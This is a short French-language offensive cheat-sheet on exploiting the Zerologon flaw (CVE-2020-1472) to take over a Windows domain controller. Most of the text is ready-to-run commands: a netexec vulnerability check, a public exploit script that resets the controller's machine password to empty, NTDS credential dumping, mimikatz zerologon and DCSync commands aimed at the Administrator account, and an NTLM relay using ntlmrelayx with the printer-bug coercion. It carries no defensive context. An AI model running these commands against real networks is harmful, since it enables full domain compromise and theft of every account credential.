Dans la pratique, la faille Zerologon (CVE-2020-1472) permet à un attaquant de prendre le contrôle d'un contrôleur de domaine, principalement de deux manières :

## Remplacer le hash du DC par un hash null

Utilisation de [https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py](https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py) :
Cet exploit va remplacer le hash du DC par un hash null, le problème de cette méthode est donc que l'AD va vite devenir inutilisable :

---
### Depuis Linux

#### Vérifier si le DC est vulnérable

```bash
netexec smb 10.10.10.10 -u "" -p "" -M zerologon
```

#### Exploitation de la faille

```bash
cve-2020-1472-exploit.py 'nomDuDC' 'adresseIpDuDC'
```

```bash
netexec smb 10.10.10.10 -u 'DC0$' -p '' --ntds
```

---
### Depuis Windows

#### L'exploit peut se faire avec mimikatz

```bash
lsadump::zerologon /target:dc.domain.local /account:DC$ /exploit
```

#### Puis on effectue le DCSync

```bash
lsadump::dcsync /domain:domain.local /dc:dc.domain.local /user:Administrator /authuser:DC$ /authdomain:domain /authpassword:"" /authntlm
```

---
### Relais NTLM

La seconde méthode, plus élégante, permet d'utiliser un relais NTLM. Cette méthode est plus simple et n'a pas la contrainte de remplacer le mot de passe du DC, n'entrainant donc pas d'instabilité de l'AD.

Plusieurs prérequis sont néanmoins nécessaires:
- Le service PrintSpooler doit tourner sur le DC
- Un compte utilisateur 
- Un second DC

Mise en place du relais NTLM :

```bash
ntlmrelayx -t dcsync://DC2 -smb2support
```

```bash
printerbug.py 'domain.local'/user:Password@ipDC ipAttaquant
```

